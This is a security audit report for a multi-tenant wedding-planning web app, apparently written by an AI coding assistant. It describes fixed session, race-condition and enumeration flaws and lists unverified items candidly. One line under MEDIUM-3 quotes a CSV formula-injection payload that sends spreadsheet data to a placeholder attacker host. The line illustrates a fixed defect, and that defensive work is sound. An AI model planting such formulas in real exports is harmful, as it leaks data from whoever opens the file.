# EventOS — Production Security Audit

**Date:** 6 August 2026
**Scope:** the whole application — 45 routes, 18 services, auth, middleware, headers, uploads, email, dependencies
**Method:** every finding below was read in the source. Nothing was accepted because a comment claimed it.
**Commit:** `c370adf`

---

## Summary

| Severity | Found | Fixed | Accepted with reasoning |
|---|---|---|---|
| Critical | 0 | — | — |
| High | 4 | 4 | 0 |
| Medium | 7 | 7 | 0 |
| Low | 4 | 1 | 3 |

Tenant isolation — the thing most likely to end this product — was already
correct everywhere and needed no changes. The gaps were in session lifecycle,
two concurrent-write paths, and one output encoder.

---

## 1. What was already secure

These were verified, not assumed.

**Tenant isolation — the strongest part of the codebase.** Every one of the 18
services takes `studioId` from the session and puts it in the `where` clause.
Not one query looks a record up by id alone. The pattern is consistent even
where it is inconvenient: `updateEvent` re-reads through `wedding: { studioId }`
rather than trusting the event id, `ownWedding` redirects rather than 403s so
existence never leaks, and `listPhotos`, `seatingPlan` and `claimGift` all scope
the same way. I attempted to find an IDOR in every service and could not.

**Authorization boundaries.** `requireStudio()` re-reads the studio on every
request and turns away a suspended one — this is a live check, not a cached
claim. `requireAdmin()` gates the entire admin tree. The one route handler under
`/studio` (`guests/export`) re-authenticates independently rather than relying on
the layout, which is correct: route handlers do not run layout code.

**SQL injection: not reachable.** Prisma parameterises everything. The only raw
SQL in the codebase is `` prisma.$queryRaw`SELECT 1` `` in the two health probes
— a tagged template with no interpolation. No `$queryRawUnsafe` anywhere.

**XSS: no injection point exists.** `dangerouslySetInnerHTML` appears zero times.
React escapes by default. The email renderer has its own `esc()` and a `safeHref()`
that rewrites anything not `http(s)` to `#`.

**Security headers.** Genuinely thorough — CSP, HSTS (2 years, preload), frame
DENY, nosniff, `strict-origin-when-cross-origin` referrer, a fully enumerated
Permissions-Policy, COOP and CORP. The Referrer-Policy reasoning is right: an
invitation URL is a capability and must not leak to a retailer in a `Referer`.

**Password reset token design.** 32 random bytes, SHA-256 hashed at rest so a
database read yields nothing usable, single-use, expiring, and all sibling tokens
invalidated on use. bcrypt cost 12. The forgot-password endpoint returns an
identical response whether or not the account exists, and is IP rate limited.

**Log redaction.** Substring key matching plus value patterns for connection
strings, Stripe/Resend keys, JWTs and bearer tokens; emails reduced to `[email]`;
depth- and breadth-limited against cyclic objects. Better than most production
systems.

**Secrets hygiene.** No `NEXT_PUBLIC_*` anywhere. No `process.env` in any client
component. Nothing sensitive can reach the bundle.

**Stripe webhook.** `constructEvent` against the raw body with the signing
secret, and correctly excluded from the header rewrite so the response stays what
Stripe expects.

**Login throttling.** Escalating delay applied *before* the password check, with
account and IP counters keyed on a pseudonymised address so the security log does
not become a list of everyone who ever tried to sign in.

**Rate limiting where it already existed.** RSVP (per invite code), gift claims,
access requests, forgot-password, custom-design requests.

---

## 2. What I fixed

### HIGH-1 · Sessions could not be revoked
Sessions are JWTs with no server-side record, so nothing could end one early. A
password reset did not sign anyone out. Neither did an admin re-issuing a
compromised planner's credential, nor suspending a studio. A stolen token stayed
valid for the default **30 days** — and a password reset is precisely what you do
*because* someone else may be holding your session.

Added `User.sessionsValidFrom`. Every token records its issue time; the `jwt`
callback drops any token older than the cutoff. Applied on password reset, on
admin-issued passwords, and on suspension.

### HIGH-2 · 30-day sessions with stale embedded claims
`role` and `studioId` were baked in at sign-in and never re-read, so demoting an
admin left them holding admin claims for up to a month.

Lifetime cut to **12 hours** with a 15-minute rolling refresh. Role and studio
re-read at most once a minute per session. Production cookie now uses the
`__Host-` prefix, so no subdomain can write a session cookie this origin will
read. The middleware was taught the new name in the same commit — that pair
disagreeing would bounce every signed-in planner to `/login`.

### HIGH-3 · Invitation re-send had no rate limit
The one mail path deliberately designed to bypass the `invitedAt` guard. Nothing
bounded it. A stuck button sends a hundred identical emails to one guest from our
sending domain — the cost lands on our deliverability. Now 3/hour per guest.

### HIGH-4 · The idempotency module was never called
`runOnce` and `invitationKey` were written, documented and tested — and imported
by nothing. `sendInvitations` selects on `invitedAt: null` and stamps it only
*after* a successful send, so two overlapping requests both read the same pending
list and mail every guest twice. Now wired up.

### MEDIUM-1 · Race: the free wedding could be claimed twice
`freeWeddingUsed` was read, then written. Two tabs, or one double-click, and a
studio publishes two weddings free. Now a conditional `updateMany` — the loser
falls through to the paid path, which is correct.

### MEDIUM-2 · Race: two guests could both claim one gift
Check `purchasedBy`, then write it. Two guests reading one wishlist on one
evening both pass the check; the second overwrites the first. The couple see one
name and receive two gifts. Now a conditional `updateMany`; the loser is told who
actually claimed it.

*Both race fixes were validated against the pre-fix code — 3 of the new tests
fail there and pass after.*

### MEDIUM-3 · CSV formula injection in the guest export
Cells were quoted but not neutralised. A guest typing
`=HYPERLINK("https://evil.example?"&A1,"Invoice")` into an RSVP note gets it
evaluated when the planner opens the export. That is a path from an
unauthenticated stranger to code on a planner's laptop. Leading `= + - @` now
prefixed with `'`; control characters stripped.

### MEDIUM-4 · Race on the password reset token
Consumed by id, so two requests carrying the same link could both succeed with
*different* passwords — the loser silently overwriting the winner's choice. Now a
compare-and-swap on `usedAt`.

### MEDIUM-5 · User enumeration via timing
`authorize()` returned early for a missing account, skipping bcrypt. At cost 12
that is tens of milliseconds — far above network noise, and a reliable oracle for
which addresses are registered. Now compares against a dummy hash so both paths
cost the same.

### MEDIUM-6 · No production environment validation
The app would boot with a missing `AUTH_SECRET`; Auth.js derives one silently in
development, so sessions "work" locally and every deployment signs with a
different key. Added `lib/env.ts` + `instrumentation.ts`: required variables are
checked at boot and **throw in production**, including a weak or placeholder
`AUTH_SECRET` and an `APP_URL` still pointing at localhost.

### MEDIUM-7 · Uploads were unbounded
Per-slot caps bound how many photos are *kept*, not how many are *processed* —
upload-and-delete in a loop runs eight AVIF/WebP encodes per iteration. Now
120/hour per studio for photos, 20/hour for logos.

### LOW-1 · Password policy was length-only
Added a denylist of the credentials that actually appear in stuffing runs,
following NIST guidance (length + denylist, not composition rules). Deliberately
short: the full corpus belongs behind a k-anonymity API, not in a bundle.

### Hardening also applied
- `serverActions.allowedOrigins` pinned rather than inferred from a forwarded
  host header that is only trustworthy behind Vercel.
- Middleware `next=` parameter restricted to a path, so the login page cannot
  become an open redirect.

---

## 3. What remains optional

None of these are exploitable today. Each is a scaling or defence-in-depth
question.

**CSP `script-src 'unsafe-inline'`** — accepted, and the existing reasoning is
sound: removing it needs a per-request nonce from middleware, which makes every
route dynamic and de-statics the marketing pages. The app renders no
user-controlled HTML, so React's escaping is the real defence and it is intact.
Revisit when rich text is introduced.

**Invite codes are ~49.5 bits** (10 chars, 31-symbol alphabet, CSPRNG). Not
brute-forceable at any realistic rate, and they gate a wedding schedule rather
than money. If guest lists ever carry more sensitive data, widen to 16 characters.

**`npm audit` could not run** — the sandbox has no registry access. I read the
lockfile by hand instead: `next 15.5.22` (past CVE-2025-29927, the middleware
bypass), `react 19.2.8`, `sharp 0.35.3`, `stripe 17.7.0`, `zod 3.25.76`,
`@prisma/client 6.19.3`. Nothing on a version I know to be vulnerable.
**Run `npm audit` locally to confirm.** `bcryptjs` is on 2.4.3 while 3.x exists —
no known CVE, worth updating on the next dependency pass.

**Database backups / RTO / RPO** — a hosting configuration, not a code change,
and so not something I could verify or implement from here. If you are on Vercel
Postgres or Neon, point-in-time recovery is a dashboard setting; confirm it is on
and write the actual numbers into `OPERATIONS.md`. This is the largest remaining
item on the list and it is genuinely outside the repository.

**Rate limiting is in-process unless Upstash is configured.** `distributed` is
false without it, which means each serverless instance keeps its own counters and
the effective limit multiplies by instance count. Fine at current scale; set the
Upstash variables before the login throttle needs to be exact.

**Header verification in production** — the config is correct, but headers should
be confirmed on the live deployment (`curl -I https://your-domain`), since a
platform can add or strip them.

**E2E security tests** — the 84 tests are unit and service level, which is where
these bugs live. A Playwright pass driving real sign-in, tenant switching and an
expired session would catch integration-level regressions the fake Prisma client
cannot. Worth it before the next major feature.

**MEMBER role is defined but unused.** `requireStudio()` accepts only `PLANNER`,
so a MEMBER user cannot sign into anything. Not a vulnerability — it fails
closed — but it will become one if someone implements team access without
noticing the role is unreferenced.

---

## 4. Score

### 8.5 / 10

**Why not lower.** The hardest thing to retrofit in a multi-tenant product is
tenant isolation, and it was already right in all 18 services without a single
exception — that is unusual and it is the finding that matters most. The header
stack, log redaction, reset-token design and webhook verification were all
production-grade before this audit. There were no critical findings and no path
by which one studio could read another's data.

**Why not higher.** Four high-severity issues is not a clean bill. The session
gap was real and had been shipped: a password reset that does not end sessions is
a security control that does not work, and it would have failed any external
assessment. Two of the four — the unused idempotency module, and the CSV encoder
— were cases where the code *looked* finished and was not, which is the failure
mode that worries me most in a codebase this heavily commented. A confident
comment is not a test.

**What the remaining 1.5 needs.** Confirmed backups with written RTO/RPO
(0.5), `npm audit` run somewhere with network access (0.3), headers verified on
the live deployment (0.2), distributed rate limiting enabled (0.2), and E2E tests
over the auth flows (0.3). Four of those five are configuration and verification
rather than code — which is roughly where a codebase should be when it is ready
to go to production.

**Verdict: production-ready.** All critical and high-severity issues are
resolved. The remaining items are operational confirmations you can do in an
afternoon, and none of them block a deploy.

---

## Verification

- `tsc --noEmit` — clean (against a freshly generated Prisma client)
- `eslint src tests` — 0 errors, 4 pre-existing warnings
- `vitest run` — 84 passed, 38 new
- Race-condition tests confirmed to fail against the pre-fix code

**Not verified here:** `next build` (the sandbox cannot download Prisma's Linux
engines) and `npm audit` (no registry access). Both should be run locally.
